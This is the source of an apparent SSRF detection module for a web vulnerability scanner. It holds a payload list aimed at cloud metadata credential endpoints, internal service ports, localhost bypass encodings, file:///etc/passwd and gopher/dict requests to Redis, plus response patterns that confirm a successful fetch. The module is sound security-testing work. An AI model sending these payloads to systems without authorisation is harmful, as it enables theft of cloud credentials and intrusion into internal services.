"""
Vexor SSRF Scanner
Server-Side Request Forgery Detection
"""
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from vexor.modules.base import BaseScanner, Finding


# SSRF payloads — internal/cloud metadata endpoints
SSRF_PAYLOADS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    # Internal
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localhost:22/",
    "http://localhost:3306/",
    "http://localhost:6379/",
    "http://localhost:27017/",
    # Bypass techniques
    "http://2130706433/",       # 127.0.0.1 decimal
    "http://0x7f000001/",       # 127.0.0.1 hex
    "http://127.1/",
    "http://127.0.1/",
    "dict://localhost:6379/info",
    "file:///etc/passwd",
    "gopher://localhost:6379/_INFO",
]

# URL parameters that might be SSRF-prone
SSRF_PARAMS = [
    'url', 'uri', 'link', 'src', 'source', 'href', 'redirect',
    'callback', 'next', 'data', 'fetch', 'load', 'path',
    'file', 'document', 'page', 'feed', 'host', 'to', 'out',
    'view', 'dir', 'show', 'open', 'site', 'html', 'val',
    'validate', 'domain', 'proxy', 'forward', 'dest', 'destination',
]

# Indicators of successful SSRF
SSRF_SUCCESS_PATTERNS = [
    r"ami-id", r"instance-id", r"security-credentials",
    r"root:x:0:0", r"daemon:x:", r"/bin/bash",
    r"computeMetadata", r"serviceAccounts",
    r"\+OK", r"-ERR",  # Redis
    r"mysql_native_password",  # MySQL
    r"SSH-2\.0",  # SSH
]


class Scanner(BaseScanner):
    """SSRF Scanner"""

    MODULE_NAME = "ssrf"
    MODULE_DESC = "Server-Side Request Forgery Detection"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_form_inputs(),
                return_exceptions=True
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        """Scan URL parameters for SSRF"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        # Find URL-like params
        ssrf_candidates = []
        for param, values in params.items():
            if param.lower() in SSRF_PARAMS:
                ssrf_candidates.append(param)
            elif values and (values[0].startswith('http') or '/' in values[0]):
                ssrf_candidates.append(param)

        # Only test params that actually exist in the URL — no guessing
        # (guessing causes false positives on sites that don't have these params)

        for param in ssrf_candidates:
            await self._test_ssrf_param(self.target, param)

    async def _test_ssrf_param(self, url: str, param: str) -> None:
        """Test a parameter for SSRF"""
        for payload in SSRF_PAYLOADS[:8]:
            test_url = self._inject_param(url, param, payload)
            resp = await self.get(test_url)

            if not resp:
                continue

            # Check for SSRF indicators in response
            if self._has_ssrf_indicator(resp.text):
                self.add_finding(Finding(
                    severity="CRITICAL",
                    module=self.MODULE_NAME,
                    vuln="Server-Side Request Forgery (SSRF)",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=self._extract_evidence(resp.text),
                    description=(
                        f"SSRF vulnerability in parameter '{param}'. "
                        f"Server fetched internal resource: {payload}"
                    ),
                    remediation=(
                        "Validate and whitelist allowed URLs. "
                        "Block requests to internal/metadata endpoints. "
                        "Use allowlist instead of blocklist."
                    ),
                ))
                return

            # Blind SSRF: timing-based detection
            # Cloud metadata endpoint should respond faster than random external URL
            # Only report if response time is suspiciously fast for internal endpoint
            import time
            if "169.254.169.254" in payload or "metadata.google" in payload:
                t0 = time.time()
                timing_resp = await self.get(test_url)
                elapsed = time.time() - t0
                # If metadata endpoint responds in < 0.5s, likely internal access
                if timing_resp and timing_resp.status_code == 200 and elapsed < 0.5:
                    self.add_finding(Finding(
                        severity="HIGH",
                        module=self.MODULE_NAME,
                        vuln="Potential Blind SSRF — Cloud Metadata",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=(
                            f"Cloud metadata endpoint responded in {elapsed:.3f}s "
                            f"(fast response suggests internal access)\n"
                            f"Payload: {payload}"
                        ),
                        description=(
                            f"Parameter '{param}' may allow SSRF to cloud metadata. "
                            f"Fast response ({elapsed:.3f}s) to metadata endpoint suggests server-side fetch."
                        ),
                        remediation=(
                            "Block requests to 169.254.169.254 and metadata.google.internal. "
                            "Implement URL allowlisting."
                        ),
                    ))
                    return

    async def _scan_form_inputs(self) -> None:
        """
        Scan form inputs for SSRF — only report if actual SSRF proof exists.
        Form input detection alone is NOT a finding (too many false positives).
        Instead, test the form submission with SSRF payloads.
        """
        response = await self.get(self.target)
        if not response:
            return

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'lxml')

            for form in soup.find_all('form'):
                action = form.get('action', self.target)
                method = form.get('method', 'get').lower()

                from urllib.parse import urljoin
                form_url = urljoin(self.target, action)

                for inp in form.find_all('input'):
                    name = inp.get('name', '').lower()
                    inp_type = inp.get('type', 'text').lower()

                    if inp_type in ['hidden', 'submit', 'button', 'checkbox', 'radio']:
                        continue

                    if not any(ssrf_param == name for ssrf_param in SSRF_PARAMS):
                        continue

                    # Actually test the form with SSRF payloads
                    for payload in SSRF_PAYLOADS[:4]:
                        try:
                            if method == 'post':
                                resp = await self.post(form_url, data={name: payload})
                            else:
                                resp = await self.get(
                                    self._inject_param(form_url, name, payload)
                                )

                            if resp and self._has_ssrf_indicator(resp.text):
                                self.add_finding(Finding(
                                    severity="CRITICAL",
                                    module=self.MODULE_NAME,
                                    vuln=f"SSRF via Form Input (param: {name})",
                                    endpoint=form_url,
                                    param=name,
                                    payload=payload,
                                    evidence=self._extract_evidence(resp.text),
                                    description=(
                                        f"Form input '{name}' is vulnerable to SSRF. "
                                        f"Server fetched internal resource: {payload}"
                                    ),
                                    remediation=(
                                        "Validate and whitelist allowed URLs in form inputs. "
                                        "Block requests to internal/metadata endpoints."
                                    ),
                                ))
                                return
                        except Exception:
                            continue
        except Exception:
            pass

    def _has_ssrf_indicator(self, text: str) -> bool:
        for pattern in SSRF_SUCCESS_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _extract_evidence(self, text: str) -> str:
        for pattern in SSRF_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(text), match.end() + 100)
                return text[start:end].strip()
        return "SSRF indicator found in response"

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
